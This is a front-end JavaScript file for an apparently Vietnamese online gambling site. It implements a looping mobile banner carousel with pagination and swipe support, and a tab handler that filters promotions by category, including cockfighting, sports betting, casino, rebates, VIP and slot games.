// 1. Mobile Banner Swiper Carousel Controller (Infinite Left-Only Loop)
// -------------------------------------------------------------
function initMobileBannerSwiper() {
  const swiperContainers = document.querySelectorAll('.home-banner-top .swiper');
  swiperContainers.forEach(container => {
    if (container.dataset.swiperInitialized === 'true') return;
    container.dataset.swiperInitialized = 'true';

    const wrapper = container.querySelector('.swiper-wrapper');
    if (!wrapper) return;

    // Extract unique base slides
    const rawSlides = Array.from(wrapper.querySelectorAll('.swiper-slide'));
    const uniqueSlidesMap = new Map();
    rawSlides.forEach(slide => {
      const img = slide.querySelector('img');
      const src = img ? img.getAttribute('src') : slide.innerHTML;
      if (src && !uniqueSlidesMap.has(src)) {
        uniqueSlidesMap.set(src, slide.cloneNode(true));
      }
    });

    const baseSlides = Array.from(uniqueSlidesMap.values());
    if (baseSlides.length <= 1) return;

    const N = baseSlides.length;

    // Build loop wrapper: [clone(last), ...baseSlides, clone(first)]
    wrapper.innerHTML = '';
    
    const firstClone = baseSlides[0].cloneNode(true);
    firstClone.classList.add('swiper-slide-duplicate');
    const lastClone = baseSlides[N - 1].cloneNode(true);
    lastClone.classList.add('swiper-slide-duplicate');

    wrapper.appendChild(lastClone);
    baseSlides.forEach(slide => {
      slide.classList.remove('swiper-slide-duplicate');
      wrapper.appendChild(slide);
    });
    wrapper.appendChild(firstClone);

    const allWrapperSlides = Array.from(wrapper.querySelectorAll('.swiper-slide'));
    allWrapperSlides.forEach(slide => {
      slide.style.width = '100%';
      slide.style.flexShrink = '0';
      slide.style.boxSizing = 'border-box';
    });

    wrapper.style.display = 'flex';
    wrapper.style.flexDirection = 'row';
    wrapper.style.width = '100%';
    wrapper.style.transition = 'none';

    let currentIndex = 1; // Start at real slide 0
    wrapper.style.transform = `translate3d(-100%, 0px, 0px)`;

    // Pagination setup matching screenshot
    let pagination = container.querySelector('.swiper-pagination');
    if (!pagination) {
      pagination = document.createElement('div');
      pagination.className = 'swiper-pagination';
      container.appendChild(pagination);
    }
    
    pagination.innerHTML = '';
    const bullets = [];
    baseSlides.forEach((_, idx) => {
      const bullet = document.createElement('span');
      bullet.className = 'swiper-pagination-bullet';
      bullet.addEventListener('click', () => {
        stopAutoplay();
        jumpToRealIndex(idx);
        startAutoplay();
      });
      pagination.appendChild(bullet);
      bullets.push(bullet);
    });

    function updateBullets(realIndex) {
      bullets.forEach((bullet, i) => {
        const diff = Math.abs(i - realIndex);
        bullet.className = 'swiper-pagination-bullet';
        if (i === realIndex) {
          bullet.classList.add('swiper-pagination-bullet-active');
          bullet.style.width = '11px';
          bullet.style.height = '11px';
          bullet.style.background = '#ffffff';
          bullet.style.opacity = '1';
          bullet.style.transform = 'scale(1.1)';
        } else if (diff === 1 || (realIndex === 0 && i === N - 1) || (realIndex === N - 1 && i === 0)) {
          bullet.style.width = '8px';
          bullet.style.height = '8px';
          bullet.style.background = 'rgba(255, 255, 255, 0.6)';
          bullet.style.opacity = '0.6';
          bullet.style.transform = 'scale(0.9)';
        } else {
          bullet.style.width = '6px';
          bullet.style.height = '6px';
          bullet.style.background = 'rgba(255, 255, 255, 0.35)';
          bullet.style.opacity = '0.35';
          bullet.style.transform = 'scale(0.7)';
        }
      });
    }

    updateBullets(0);

    let isTransitioning = false;
    let timer = null;

    function slideTo(index, duration = 600) {
      if (isTransitioning) return;
      isTransitioning = true;
      currentIndex = index;

      wrapper.style.transition = `transform ${duration}ms cubic-bezier(0.25, 1, 0.5, 1)`;
      wrapper.style.transform = `translate3d(-${currentIndex * 100}%, 0px, 0px)`;

      const realIndex = (currentIndex - 1 + N) % N;
      updateBullets(realIndex);

      setTimeout(() => {
        if (currentIndex >= N + 1) { // reached right clone of slide 0 -> jump seamlessly to real slide 0
          wrapper.style.transition = 'none';
          currentIndex = 1;
          wrapper.style.transform = `translate3d(-100%, 0px, 0px)`;
          void wrapper.offsetHeight; // force reflow
        } else if (currentIndex <= 0) { // reached left clone of slide N-1 -> jump seamlessly to real slide N-1
          wrapper.style.transition = 'none';
          currentIndex = N;
          wrapper.style.transform = `translate3d(-${N * 100}%, 0px, 0px)`;
          void wrapper.offsetHeight; // force reflow
        }
        isTransitioning = false;
      }, duration);
    }

    function slideNext() {
      slideTo(currentIndex + 1); // Strictly slide left to next item
    }

    function slidePrev() {
      slideTo(currentIndex - 1);
    }

    function jumpToRealIndex(realIdx) {
      slideTo(realIdx + 1);
    }

    function startAutoplay() {
      stopAutoplay();
      timer = setInterval(slideNext, 4500); // Slower continuous left-only loop delay matching original site
    }

    function stopAutoplay() {
      if (timer) clearInterval(timer);
    }

    // Touch swipe gestures
    let startX = 0;
    let dist = 0;

    container.addEventListener('touchstart', e => {
      stopAutoplay();
      startX = e.touches[0].clientX;
      dist = 0;
    }, { passive: true });

    container.addEventListener('touchmove', e => {
      if (!startX) return;
      dist = e.touches[0].clientX - startX;
    }, { passive: true });

    container.addEventListener('touchend', () => {
      if (Math.abs(dist) > 35) {
        if (dist > 0) {
          slidePrev();
        } else {
          slideNext();
        }
      }
      startX = 0;
      dist = 0;
      startAutoplay();
    }, { passive: true });

    // Prev/Next Navigation Button Click Handlers
    const prevBtn = container.querySelector('.swiper-button-prev');
    const nextBtn = container.querySelector('.swiper-button-next');
    if (prevBtn) {
      prevBtn.style.cursor = 'pointer';
      prevBtn.style.zIndex = '20';
      prevBtn.addEventListener('click', e => {
        e.preventDefault();
        e.stopPropagation();
        stopAutoplay();
        slidePrev();
        startAutoplay();
      });
    }
    if (nextBtn) {
      nextBtn.style.cursor = 'pointer';
      nextBtn.style.zIndex = '20';
      nextBtn.addEventListener('click', e => {
        e.preventDefault();
        e.stopPropagation();
        stopAutoplay();
        slideNext();
        startAutoplay();
      });
    }

    startAutoplay();
  });
}



if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initMobileBannerSwiper);
} else {
  initMobileBannerSwiper();
}
window.addEventListener('load', initMobileBannerSwiper);


// -------------------------------------------------------------
// 2. Interactive Promotion Category Tabs Handler
// -------------------------------------------------------------
document.addEventListener('click', function(e) {
  const categoryTab = e.target.closest('.section-promo .category .category-item, .m-promo-nav .nav-item, .m-promo-nav .swiper-slide');
  if (categoryTab) {
    e.preventDefault();

    const navContainer = categoryTab.closest('.category, .swiper-wrapper, .m-promo-nav');
    if (navContainer) {
      navContainer.querySelectorAll('.category-item, .nav-item').forEach(el => el.classList.remove('active'));
    }

    let activeItem = categoryTab;
    if (categoryTab.classList.contains('swiper-slide')) {
      const innerNav = categoryTab.querySelector('.nav-item');
      if (innerNav) {
        innerNav.classList.add('active');
        activeItem = innerNav;
      }
    } else {
      categoryTab.classList.add('active');
    }

    const categoryText = (activeItem.textContent || activeItem.innerText).trim().toLowerCase();

    const promoItems = document.querySelectorAll('.promo-grid-item, .promo-banner-item');
    promoItems.forEach(item => {
      if (categoryText === 'tất cả' || categoryText === 'tat ca' || categoryText === 'all') {
        item.style.display = '';
        return;
      }

      const altText = (item.querySelector('img')?.getAttribute('alt') || item.getAttribute('data-promo') || '').toLowerCase();

      let isMatch = false;
      if (categoryText.includes('đá gà') || categoryText.includes('da ga')) {
        isMatch = altText.includes('đá gà') || altText.includes('da ga');
      } else if (categoryText.includes('thể thao') || categoryText.includes('the thao')) {
        isMatch = altText.includes('thể thao') || altText.includes('the thao') || altText.includes('world cup');
      } else if (categoryText.includes('casino') || categoryText.includes('sòng bài')) {
        isMatch = altText.includes('casino') || altText.includes('thắng/thua') || altText.includes('188k');
      } else if (categoryText.includes('hoàn trả') || categoryText.includes('hoan tra')) {
        isMatch = altText.includes('hoàn trả') || altText.includes('hoan tra') || altText.includes('nạp lại') || altText.includes('hợp lệ');
      } else if (categoryText.includes('vip')) {
        isMatch = altText.includes('vip');
      } else if (categoryText.includes('bắn cá') || categoryText.includes('nổ hũ')) {
        isMatch = altText.includes('bắn cá') || altText.includes('nổ hũ') || altText.includes('may mắn');
      }

      item.style.display = isMatch ? '' : 'none';
    });
  }
});

